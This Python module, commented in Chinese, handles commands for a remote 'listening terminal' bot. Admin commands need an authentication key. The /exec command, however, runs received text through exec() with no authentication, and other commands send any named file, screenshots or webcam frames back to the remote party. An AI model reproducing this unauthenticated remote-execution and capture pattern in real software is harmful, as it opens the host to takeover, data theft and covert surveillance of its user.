"""
与具体传输通道无关的监听终端命令处理
"""
import os

import cv2
import pyautogui

from . import api
from .functions import log

# 命令行命令的远程入口
CLI_COMMANDS = {
    "/find": "find",
    "/count": "count",
    "/check": "check",
    "/calculate": "calculate",
    "/dellog": "dellog",
    "/listfiles": "listfiles",
    "/verify": "verify",
    "/upload": "upload",
}

# 需要创始人权限的命令
ADMIN_COMMANDS = {"dellog", "listfiles", "verify", "upload"}

RESULT_FILENAME = "运行结果.txt"

CONFIRM_HINT = "回复 /y 确认执行，/n 取消"

COMMAND_LIST = (
    "/test",
    "/exec",
    "/sendfile",
    "/screenshot",
    "/camera-screenshot",
    "/y",
    "/n",
    "/exit",
    *CLI_COMMANDS,
)

class RemoteTerminal:
    """监听终端的指令处理器

    子类只需实现 reply / send_file / send_image / send_auth_card / cancel_auth_card
    """

    # 待人工确认的命令: (命令行, 确认提示, 确认后是否自动应答剩余确认)
    _pending: tuple[str, str, bool] | None = None
    # 当前密钥卡片的 message_id，由传输层维护
    _auth_card_id: str | None = None

    def reply(self, text: str) -> None:
        raise NotImplementedError

    def send_file(self, path: str) -> None:
        raise NotImplementedError

    def send_image(self, path: str) -> None:
        raise NotImplementedError

    def send_auth_card(self) -> None:
        """发送密钥输入卡片（传输层实现）"""
        raise NotImplementedError

    def cancel_auth_card(self) -> None:
        """撤回当前密钥卡片（传输层实现）"""
        raise NotImplementedError

    def authenticate(self, key: str) -> bool:
        """用《朝花夕拾协议》的宗旨校验创始人权限"""
        return api.authenticate(key)

    def notify(self, text: str) -> None:
        """尽力回执: 通道异常时不让指令处理崩掉"""
        try:
            self.reply(text)
        except Exception as e:
            log(f"回执发送失败: {e}", "error")

    def handle(self, command: str) -> str:
        """执行一条指令；未鉴权时让密钥卡片始终跟在最新消息后面"""
        result = self._dispatch(command)
        if result != "continue" or api.is_admin() or not self._auth_card_id:
            return result

        command = command.strip()
        first = command.split(" ")[0].lower()
        # 确认回复与未知指令不刷新卡片
        if first in ("/y", "/n") or first not in COMMAND_LIST:
            return result
        # 未鉴权的创始人命令已在 _dispatch 里换成新卡片
        if first in CLI_COMMANDS and CLI_COMMANDS[first] in ADMIN_COMMANDS:
            return result

        self._replace_auth_card()
        return result

    def _dispatch(self, command: str) -> str:
        command = command.strip()
        first = command.split(" ")[0]
        lowered = first.lower()
        # 兼容旧习惯: 即使 /auth 已删除，也不把可能携带的密钥写进日志
        shown = f"{first} ***" if lowered == "/auth" and " " in command else command
        log(f"[远程终端指令] {shown}", "info")

        # 确认与取消优先处理
        if lowered in ("/y", "/n"):
            return self._confirm(lowered == "/y")

        if command == "/exit":
            log("检测到终端退出指令", "info")
            log("终端监听任务终止", "info")
            self.notify("终端已关闭")
            return "exit"

        # 有未决确认时，只允许先回答 /y 或 /n
        if self._pending is not None:
            question = self._pending[1]
            self.notify(f"有待确认的操作: \n{question}\n{CONFIRM_HINT}")
            return "continue"

        if first not in COMMAND_LIST:
            if first.startswith("/"):
                self.notify("没有此命令")
            return "continue"

        if first in CLI_COMMANDS:
            name = CLI_COMMANDS[first]
            args = command.split(" ", 1)[1] if " " in command else ""
            if name in ADMIN_COMMANDS:
                if not api.is_admin():
                    log(f"未鉴权，拒绝执行创始人命令: {name}", "warning")
                    self._replace_auth_card()
                    return "continue"
                # 查看帮助不需要确认
                if "/?" in args:
                    return self._run_cli(f"{name} {args}".strip())
                question = f"{name} {args}".strip()
                return self._ask(
                    question,
                    f"确定要执行 {question} 吗？",
                    auto_answer=False,
                )
            return self._run_cli(f"{name} {args}".strip())

        if command == "/test":
            log("检测到测试指令", "info")
            log("一切为了不远后的旧事重提", "info")
            self.notify("一切为了不远后的旧事重提")
            return "continue"

        if first == "/exec":
            remote_cmd = " ".join(command.split(" ")[1:]).strip()
            log(f"检测到远程执行命令: {remote_cmd}", "info")
            log("开始执行", "info")
            try:
                exec(remote_cmd, globals())
            except Exception as e:
                log("执行中发生错误", "warning")
                log(str(e), "error")
                self.notify(str(e))
                return "continue"
            self.notify("执行完毕")
            return "continue"

        if first == "/sendfile":
            log("检测到文件发送指令", "info")
            paths = command.split(" ")[1:]
            existing = [p for p in paths if p and os.path.exists(p)]
            if not existing:
                log("没有找到可发送的文件", "warning")
                self.notify("没有找到可发送的文件")
                return "continue"
            log("开始获取文件", "info")
            log("开始发送", "info")
            self.notify("开始发送")
            for path in existing:
                try:
                    self.send_file(path)
                except Exception as e:
                    log(f"发送文件 {path} 失败: {e}", "error")
                    self.notify(f"发送文件失败: {e}")
            return "continue"

        if command == "/screenshot":
            log("检测到截屏指令", "info")
            path = os.path.abspath("screenshot.jpg")
            try:
                pyautogui.screenshot().save(path)
                log("发送截屏中", "info")
                self.notify("发送截屏中")
                self.send_image(path)
            except Exception as e:
                log(f"截屏失败: {e}", "error")
                self.notify(f"截屏失败: {e}")
            finally:
                if os.path.exists(path):
                    os.remove(path)
            return "continue"

        if command == "/camera-screenshot":
            log("检测到摄像头截屏指令", "info")
            path = os.path.abspath("camera_screenshot.jpg")
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                log("无法打开摄像头", "warning")
                self.notify("无法打开摄像头")
                return "continue"
            try:
                ret, frame = cap.read()
                if not ret:
                    log("无法从摄像头捕获图像", "warning")
                    self.notify("无法从摄像头捕获图像")
                    return "continue"
                cv2.imwrite(path, frame)
            finally:
                cap.release()
            try:
                log("发送摄像头截屏中", "info")
                self.notify("发送摄像头截屏中")
                self.send_image(path)
            except Exception as e:
                log(f"发送摄像头截屏失败: {e}", "error")
                self.notify(f"发送摄像头截屏失败: {e}")
            finally:
                if os.path.exists(path):
                    os.remove(path)
            return "continue"

        return "continue"

    def _replace_auth_card(self) -> None:
        """撤回旧卡片，再在消息末尾发送一张新卡片"""
        try:
            self.cancel_auth_card()
        except Exception as e:
            log(f"撤回密钥卡片失败: {e}", "warning")
        try:
            self.send_auth_card()
        except Exception as e:
            log(f"发送密钥卡片失败: {e}", "error")
            self.notify(f"发送密钥卡片失败: {e}")

    def _run_cli(self, command_line: str, *, answer: bool | None = None) -> str:
        """执行 api.py 封装好的命令行命令，并按输出长度选择回执方式"""
        log(f"执行命令行命令: {command_line}", "info")
        result = api.run(command_line, answer=answer)

        # 命令内部还有确认步骤时，交回用户决定
        if result.needs_confirmation:
            return self._ask(result.command, result.question, auto_answer=True)

        if not result.ok:
            log(f"命令行命令执行失败: {result.error}", "error")
            self.notify(result.error or "执行失败")
            return "continue"

        output = result.output.strip()
        if not output:
            self.notify("执行完毕")
        elif "\n" in output:
            self._send_result_file(output)
        else:
            self.notify(output)
        return "continue"

    def _ask(self, command_line: str, question: str, *, auto_answer: bool) -> str:
        """记录待确认命令，等待用户回复 /y 或 /n"""
        question = question or f"确定要执行 {command_line} 吗？"
        self._pending = (command_line, question, auto_answer)
        log(f"等待人工确认: {command_line}", "info")
        self.notify(f"{question}\n{CONFIRM_HINT}")
        return "continue"

    def _confirm(self, yes: bool) -> str:
        """处理 /y 与 /n。确认后按待确认类型重试命令"""
        pending = self._pending
        if pending is None:
            self.notify("当前没有待确认的操作")
            return "continue"
        self._pending = None
        command_line, _, auto_answer = pending
        if not yes:
            log(f"用户取消命令: {command_line}", "info")
            self.notify("已取消")
            return "continue"
        log(f"用户确认命令: {command_line}", "info")
        # 执行前的确认: 先放行本身，命令内部若还有确认会再次询问
        # 内部确认: 已得到用户许可，直接应答为“是”
        return self._run_cli(command_line, answer=True if auto_answer else None)

    def _send_result_file(self, text: str) -> None:
        """把多行运行结果写成文本文件发送，发送结束后删除临时文件"""
        path = os.path.abspath(RESULT_FILENAME)
        with open(path, "w", encoding="utf-8-sig") as f:
            f.write(text + "\n")
        log(f"运行结果共 {len(text.splitlines())} 行，开始发送文件", "info")
        try:
            self.send_file(path)
        except Exception as e:
            log(f"发送运行结果文件失败: {e}", "error")
            self.notify(f"发送运行结果文件失败: {e}")
        finally:
            if os.path.exists(path):
                os.remove(path)
                log("已删除运行结果.txt", "info", logfile_only=True)
